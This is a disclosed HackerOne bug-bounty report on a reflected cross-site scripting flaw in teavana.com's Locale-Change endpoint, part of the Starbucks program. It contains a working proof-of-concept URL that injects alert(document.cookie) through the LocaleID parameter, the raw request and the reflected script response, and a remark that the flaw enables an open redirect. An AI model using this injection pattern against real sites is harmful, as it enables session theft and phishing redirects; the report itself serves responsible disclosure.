# Reflected XSS on teavana.com (Locale-Change)

## Report Details
- **Report ID**: 190798
- **URL**: https://hackerone.com/reports/190798
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-12-13T11:40:29.111Z
- **Disclosed**: 2017-06-09T00:00:19.014Z

## Reporter
- **Username**: inhibitor181
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
SUMMARY
----
Hello, the link at https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=en_CA (was identified by changing languages) is prone to reflected XSS in the "en" zone of the LocaleID parameter. One can inject javascript that will be reflected back to the target while calling the modified link. 

POC
-----
https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(document.cookie);//an_CA

This injection is possible because the contents before the _CA are not validated and it will be injected in the response.

Request :

```
GET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA HTTP/1.1
Host: www.teavana.com
```

Response :

```
<script type="text/javascript">
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
uri=decodeURIComponent(uri);
if(uri.indexOf("/ca/en") >=0){
  uri=uri.replace("/ca/en","");
}
else if(uri.indexOf("/ca/fr") >=0){
  uri=uri.replace("/ca/fr","");
}
window.location = uri;
</script>
```

Note the : var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';

This can also be modified to easily make an open redirect.

Also attached screenshot.

## Attachments
- xss_tea.png
